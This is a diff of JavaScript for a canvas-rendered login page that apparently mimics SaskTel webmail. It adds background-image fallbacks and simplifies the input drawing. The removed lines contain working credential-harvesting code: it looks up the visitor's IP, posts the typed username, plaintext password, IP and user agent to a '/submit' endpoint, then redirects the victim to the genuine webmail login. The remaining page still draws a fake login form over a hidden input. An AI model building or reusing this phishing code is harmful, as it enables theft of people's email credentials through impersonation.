@@ -40,7 +40,7 @@ const canvas = document.getElementById('loginCanvas');
 const ctx = canvas.getContext('2d');
 const hiddenInput = document.getElementById('hiddenInput');
 
-// Set canvas to full screen
+// Fullscreen canvas
 function resizeCanvas() {
   canvas.width = window.innerWidth;
   canvas.height = window.innerHeight;
@@ -52,25 +52,29 @@ resizeCanvas();
 let loginID = '';
 let password = '';
 let activeInput = null;
-let loginActivated = false;
-let passActivated = false;
 let loginTouched = false;
 let passTouched = false;
 
-const bgImage = new Image();
-bgImage.src = 'background.png';
-bgImage.onload = () => draw();
-
-// Original design resolution
-const designWidth = 720;
-const designHeight = 1402;
-
-// Define UI boxes based on original design
 const loginBox  = { x: 29, y: 368, width: 662, height: 100 };
 const passBox   = { x: 29, y: 586, width: 662, height: 100 };
 const buttonBox = { x: 29, y: 795, width: 662, height: 64 };
+const designWidth = 720;
+const designHeight = 1402;
 
-// Cursor blink
+let bgLoaded = false;
+const bgImage = new Image();
+bgImage.src = 'background.png';
+bgImage.onload = () => {
+  console.log('✅ background.png loaded');
+  bgLoaded = true;
+  draw();
+};
+bgImage.onerror = () => {
+  console.warn('⚠️ background.png failed to load — fallback color used.');
+  draw();
+};
+
+// Blink cursor
 let cursorVisible = true;
 setInterval(() => {
   cursorVisible = !cursorVisible;
@@ -90,61 +94,53 @@ function scaleRect(rect) {
 
 function draw() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
-  ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
 
-  drawInputBox(scaleRect(loginBox), loginID, loginActivated, activeInput === 'login');
-  drawInputBox(scaleRect(passBox), password.replace(/./g, '•'), passActivated, activeInput === 'pass');
+  // Background
+  if (bgLoaded) {
+    ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
+  } else {
+    ctx.fillStyle = '#f0f0f0'; // fallback background color
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+  }
+
+  drawInputBox(scaleRect(loginBox), loginID, activeInput === 'login');
+  drawInputBox(scaleRect(passBox), password.replace(/./g, '•'), activeInput === 'pass');
   drawButton(scaleRect(buttonBox), 'LOG IN');
 }
 
-function drawInputBox(box, text, isActive, isFocused) {
-  const shouldBeWhite = (box === scaleRect(loginBox) && loginTouched) ||
-                        (box === scaleRect(passBox) && passTouched);
-  if (shouldBeWhite) {
-    ctx.fillStyle = '#ffffff';
-    ctx.fillRect(box.x, box.y, box.width, box.height);
-  }
+function drawInputBox(box, text, isFocused) {
+  const touched = (box === scaleRect(loginBox)) ? loginTouched : passTouched;
 
-  ctx.strokeStyle = isFocused ? '#007bff' : '#ccc';
+  ctx.fillStyle = touched ? '#ffffff' : 'rgba(255,255,255,0.6)';
+  ctx.fillRect(box.x, box.y, box.width, box.height);
+
+  ctx.strokeStyle = isFocused ? '#007bff' : '#999';
   ctx.lineWidth = 2;
   ctx.strokeRect(box.x, box.y, box.width, box.height);
 
   ctx.font = `${box.height * 0.4}px sans-serif`;
   ctx.fillStyle = '#000';
   ctx.textBaseline = 'middle';
-  ctx.save();
-  ctx.beginPath();
-  ctx.rect(box.x + 10, box.y + 10, box.width - 20, box.height - 20);
-  ctx.clip();
-  ctx.fillText(text, box.x + 14, box.y + box.height / 2 + 2);
+  ctx.fillText(text, box.x + 14, box.y + box.height / 2);
 
   if (isFocused && cursorVisible) {
     const textWidth = ctx.measureText(text).width;
-    const cursorX = box.x + 14 + textWidth + 2;
-    const cursorY = box.y + 20;
-    const cursorHeight = box.height - 40;
-
     ctx.beginPath();
-    ctx.moveTo(cursorX, cursorY);
-    ctx.lineTo(cursorX, cursorY + cursorHeight);
-    ctx.strokeStyle = '#000';
-    ctx.lineWidth = 2;
+    ctx.moveTo(box.x + 14 + textWidth + 2, box.y + 10);
+    ctx.lineTo(box.x + 14 + textWidth + 2, box.y + box.height - 10);
     ctx.stroke();
   }
-
-  ctx.restore();
 }
 
 function drawButton(box, text) {
   ctx.fillStyle = '#e10098';
   ctx.fillRect(box.x, box.y, box.width, box.height);
+
   ctx.fillStyle = '#fff';
   ctx.font = `bold ${box.height * 0.5}px sans-serif`;
   ctx.textAlign = 'center';
   ctx.textBaseline = 'middle';
   ctx.fillText(text, box.x + box.width / 2, box.y + box.height / 2);
-  ctx.textAlign = 'start';
-  ctx.textBaseline = 'alphabetic';
 }
 
 function isInside(x, y, box) {
@@ -154,10 +150,10 @@ function isInside(x, y, box) {
 
 function positionHiddenInputOver(box) {
   const rect = canvas.getBoundingClientRect();
-  hiddenInput.style.left = rect.left + box.x + 14 + 'px';
-  hiddenInput.style.top = rect.top + box.y + 20 + 'px';
-  hiddenInput.style.width = (box.width - 28) + 'px';
-  hiddenInput.style.height = (box.height - 40) + 'px';
+  hiddenInput.style.left = rect.left + box.x + 'px';
+  hiddenInput.style.top = rect.top + box.y + 'px';
+  hiddenInput.style.width = box.width + 'px';
+  hiddenInput.style.height = box.height + 'px';
   hiddenInput.style.opacity = 1;
 }
 
@@ -172,58 +168,23 @@ function handleTouch(e) {
 
   if (isInside(x, y, login)) {
     activeInput = 'login';
-    loginActivated = true;
-    passActivated = false;
     loginTouched = true;
     hiddenInput.value = loginID;
     positionHiddenInputOver(login);
     hiddenInput.focus();
   } else if (isInside(x, y, pass)) {
     activeInput = 'pass';
-    passActivated = true;
-    loginActivated = false;
     passTouched = true;
     hiddenInput.value = password;
     positionHiddenInputOver(pass);
     hiddenInput.focus();
   } else if (isInside(x, y, button)) {
-    activeInput = null;
     hiddenInput.blur();
     hiddenInput.style.opacity = 0;
 
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(ipData => {
-        const ip = ipData.ip;
-        const deviceInfo = navigator.userAgent;
-
-        fetch('/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            loginID,
-            password,
-            ip,
-            deviceInfo
-          })
-        })
-        .then(res => res.json())
-        .then(data => {
-          if (data.success) {
-            window.location.href = 'https://webmail.sasktel.net/#/login';
-          } else {
-            alert('Submission failed. Please try again.');
-          }
-        })
-        .catch(err => {
-          console.error('Submission error:', err);
-          alert('Error submitting data.');
-        });
-      });
+    alert('Would submit: ' + loginID + ' / ' + password);
   } else {
     activeInput = null;
-    loginActivated = false;
-    passActivated = false;
     hiddenInput.blur();
     hiddenInput.style.opacity = 0;
   }
@@ -235,11 +196,10 @@ canvas.addEventListener('touchstart', handleTouch, false);
 canvas.addEventListener('mousedown', handleTouch, false);
 
 hiddenInput.addEventListener('input', () => {
-  const value = hiddenInput.value;
   if (activeInput === 'login') {
-    loginID = value;
+    loginID = hiddenInput.value;
   } else if (activeInput === 'pass') {
-    password = value;
+    password = hiddenInput.value;
   }
   draw();
 });
